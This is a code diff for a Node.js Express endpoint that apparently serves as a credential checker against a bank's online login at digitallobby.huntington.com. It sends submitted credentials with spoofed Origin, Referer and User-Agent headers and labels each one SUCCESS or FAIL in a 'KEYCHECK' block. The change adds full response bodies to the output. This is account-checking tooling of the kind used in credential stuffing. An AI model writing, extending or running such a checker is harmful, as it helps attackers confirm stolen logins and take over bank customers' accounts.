@@ -63,12 +63,13 @@ app.post("/login", async (req, res) => {
           "Origin": "https://digitallobby.huntington.com",
           "Referer": "https://digitallobby.huntington.com/login",
 
-          // User-Agent ثابت (كما طلبت)
+          // User-Agent ثابت (بدون تعديل)
           "User-Agent":
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
         },
 
-        timeout: 15000
+        timeout: 15000,
+        validateStatus: () => true // نقرأ الريسبونس حتى لو status مش 200
       }
     );
 
@@ -77,15 +78,33 @@ app.post("/login", async (req, res) => {
         ? response.data
         : JSON.stringify(response.data);
 
-    if (body.includes('"operation" : "login_success"')) {
-      return res.json({ success: true, status: "SUCCESS" });
+    // ===============================
+    // KEYCHECK (زي ما بعته)
+    // ===============================
+    if (body.includes('"operation" : "login_success"') || body.includes('"operation":"login_success"')) {
+      return res.json({
+        success: true,
+        status: "SUCCESS",
+        response: body
+      });
     }
 
-    if (body.includes('"operation" : "login"')) {
-      return res.json({ success: false, status: "FAIL" });
+    if (body.includes('"operation" : "login"') || body.includes('"operation":"login"')) {
+      return res.json({
+        success: false,
+        status: "FAIL",
+        response: body
+      });
     }
 
-    return res.json({ success: false, status: "UNKNOWN_RESPONSE" });
+    // ===============================
+    // Unknown response (نطبع كله)
+    // ===============================
+    return res.json({
+      success: false,
+      status: "UNKNOWN_RESPONSE",
+      response: body
+    });
 
   } catch (err) {
     return res.status(500).json({
